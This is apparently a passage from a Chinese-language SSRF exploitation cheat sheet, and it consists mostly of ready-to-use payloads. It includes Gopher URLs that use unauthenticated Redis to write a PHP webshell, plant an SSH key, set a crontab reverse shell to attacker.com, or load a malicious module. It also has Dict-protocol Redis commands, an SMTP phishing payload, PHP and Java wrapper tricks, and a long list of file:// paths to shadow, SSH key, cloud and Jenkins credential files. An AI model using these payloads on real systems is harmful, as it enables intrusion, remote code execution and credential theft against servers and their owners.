## 五、协议级高级利用

### 5.1 Gopher协议（最强大）
Gopher协议可以构造任意TCP数据流，是SSRF RCE的核心协议。

**Gopher协议格式：**
```
gopher://host:port/_[TCP数据流，%0d%0a分隔]
```
注意：`_`后的数据会被发送，换行符需URL编码为`%0d%0a`

**Redis未授权访问RCE：**
```
# 1. 写WebShell
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20payload%20%22%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 2. 写Crontab反弹Shell
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20payload%20%22%5Cn%5Cn%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/attacker.com/4444%200%3E%261%5Cn%5Cn%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 3. 写SSH公钥
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSET%20payload%20%22%5Cn%5Cnssh-rsa%20AAAAB3NzaC1yc...%20attacker%40local%5Cn%5Cn%22%0d%0aSAVE%0d%0aQUIT%0d%0a

# 4. 主从复制RCE（Redis 4.x/5.x）
gopher://127.0.0.1:6379/_SLAVEOF attacker.com 6379%0d%0aCONFIG SET dbfilename exp.so%0d%0aREPLCONF DBFNAME exp.so%0d%0aMODULE LOAD ./exp.so%0d%0aSLAVEOF NO ONE%0d%0aSYSTEM.EXEC 'whoami'%0d%0a
```

**FastCGI（PHP-FPM 9000端口）RCE：**
```
# 构造FastCGI协议包，执行任意PHP代码
# 使用gopherus工具生成
python gopherus.py --exploit fastcgi

# 关键步骤：
# 1. 构造FastCGI_PARAMS
# 2. 设置SCRIPT_FILENAME为可访问PHP文件
# 3. 通过PHP_ADMIN_VALUE设置auto_prepend_file=php://input
# 4. POST body为PHP代码
# 5. Gopher协议封装
gopher://127.0.0.1:9000/_%01%01...（完整FastCGI二进制包）
```

**MySQL协议利用：**
```
# 构造MySQL认证包 + SQL查询
gopher://127.0.0.1:3306/_...（MySQL协议包）
# 可用于：
# - 读取MySQL密码hash
# - 写WebShell（需FILE权限+secure_file_priv为空）
# - 利用UDF提权
```

**Memcached未授权：**
```
# Memcached命令执行（通过Gopher发送set命令）
gopher://127.0.0.1:11211/_set%20key%200%200%204%0d%0aTEST%0d%0a
# 通过Memcached注入SSRF/RCE（SSRF→Memcached→SRCache等）
# 配合其他服务利用
```

**SMTP邮件发送：**
```
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM%3A%3Ca%40a.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aFrom%3A%20admin%40target.com%0d%0aSubject%3A%20Reset%0d%0a%0d%0aClick%20http%3A//attacker.com/%0d%0a.%0d%0aQUIT%0d%0a
```

### 5.2 Dict协议
```
# 端口探测
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:3306/INFO

# Redis命令执行
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20x%20%22%3C%3Fphp%20eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%22
dict://127.0.0.1:6379/SAVE
```

### 5.3 File协议深度利用
```
# Linux系统文件
file:///etc/passwd
file:///etc/shadow                            （需root）
file:///etc/hosts
file:///etc/hostname
file:///proc/self/cmdline                     （当前进程命令行）
file:///proc/self/environ                     （环境变量，可能含密钥）
file:///proc/self/exe                         （进程二进制）
file:///proc/self/fd/                         （打开的文件描述符）
file:///proc/version                          （内核版本）
file:///proc/net/tcp                          （TCP连接）
file:///proc/net/fib_trie                     （路由表，发现内网段）
file:///proc/sched_debug                      （进程信息）
file:///root/.ssh/id_rsa                      （SSH私钥）
file:///root/.bash_history                    （命令历史）
file:///var/log/apache2/access.log            （Apache日志）
file:///var/log/nginx/access.log              （Nginx日志）
file:///var/www/html/.env                     （环境变量，数据库密码）
file:///var/www/html/wp-config.php            （WordPress配置）
file:///var/www/html/config.php               （配置文件）
file:///var/www/html/application/config/database.php
file:///etc/nginx/nginx.conf                  （Nginx配置）
file:///etc/httpd/conf/httpd.conf             （Apache配置）
file:///etc/php/7.x/apache2/php.ini           （PHP配置）
file:///etc/mysql/my.cnf                      （MySQL配置）
file:///etc/sysconfig/network-scripts/ifcfg-eth0  （网卡配置）

# Windows系统文件
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/win.ini
file:///C:/Windows/System32/config/SAM         （SAM数据库，需权限）
file:///C:/inetpub/wwwroot/web.config          （IIS配置）
file:///C:/Users/Administrator/NTUser.dat
file:///C:/Windows/debug/Passwd.log
file:///C:/Windows/Panther/Unattend/Unattended.xml  （Unattend安装密码）
file:///C:/Users/Administrator/.ssh/id_rsa
file:///C:/xampp/phpmyadmin/config.inc.php
file:///C:/phpStudy/WWW/config.php
file:///C:/wamp/www/config.ini.php

# 应用配置文件
file:///root/.aws/credentials                  （AWS凭证）
file:///root/.gcloud/access_tokens.db          （GCP凭证）
file:///root/.kube/config                      （Kubernetes config）
file:///var/lib/jenkins/credentials.xml        （Jenkins凭证）
file:///root/.m2/settings.xml                  （Maven配置含密码）
file:///root/.bashrc
file:///root/.git-credentials                  （Git凭证）
```

### 5.4 PHP流包装器
```
# php://filter读取文件源码（Base64编码避免执行）
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=index.php

# php://input POST数据执行
php://input  （POST body为PHP代码）

# data://伪协议
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
data:text/html,<script>alert(1)</script>

# phar://触发反序列化
phar:///path/to/uploaded.phar/somefile.txt
# 触发Phar反序列化，配合pop chain RCE

# zip://
zip:///path/to/file.zip%23shell.php            （#编码为%23）
```

### 5.5 Java特有协议
```
# jar://读取文件
jar:http://attacker.com/file.zip!/file.txt
jar:file:/path/to/file.zip!/file.txt
jar:https://attacker.com/file.jar!/META-INF/spring.factories

# netdoc://（Java本地文件）
netdoc:///etc/passwd

# Java URLClassLoader RCE
# 通过URL加载恶意JAR文件执行
```

